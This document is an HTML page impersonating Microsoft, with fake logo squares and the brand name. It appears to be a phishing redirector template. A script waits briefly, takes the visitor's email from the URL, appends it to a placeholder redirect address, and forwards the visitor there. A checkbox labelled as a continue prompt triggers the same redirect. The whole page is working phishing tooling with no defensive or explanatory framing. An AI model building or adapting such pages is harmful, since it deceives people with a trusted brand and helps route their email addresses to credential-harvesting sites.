<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(redirect, 632);
        });

        // Fun
        function redirect() {
            var email = getParameterByName('email'); // Atr
            var redirectUrl = "{{REDIRECT_URL}}";

            if (email) {
                redirectUrl += email; // Apd
            } else {
                console.log("No email provided. Redirecting without email.");
            }

            console.log("Redirecting to: " + redirectUrl);
            window.location.href = redirectUrl;
        }

        // Fun
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            var results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Fun
        function handleCheckboxClick(checkbox) {
            if (checkbox.checked) {
                console.log("Checkbox is checked. Redirecting...");
                redirect();
            } else {
                console.log("Checkbox is not checked.");
            }
        }
    </script>
</head>
<body>
   <div style="font-size: 16px; line-height: 6px; padding:  0px; text-align: left; display: flex; align-items: center;">
      <div style="display: flex; flex-wrap: wrap; width: 22px; height: 22px; margin-right: 5px;">
        <div style="width: 10px; height: 10px; background-color: #F25022; margin: 0.5px;"></div>
        <div style="width: 10px; height: 10px; background-color: #7FBA00; margin: 0.5px;"></div>
        <div style="width: 10px; height: 10px; background-color: #00A4EF; margin: 0.5px;"></div>
        <div style="width: 10px; height: 10px; background-color: #FFB900; margin: 0.5px;"></div>
      </div>
      <div style="margin-right: 50px; font-size: 19px; font-weight: normal; color: #5E5E5E;">Microsoft</div>

    <label>
        <input type="checkbox" onclick="handleCheckboxClick(this)">
        Redirecting..., please wait or click this box to continue.
    </label>  </div>  
</body>
</html>
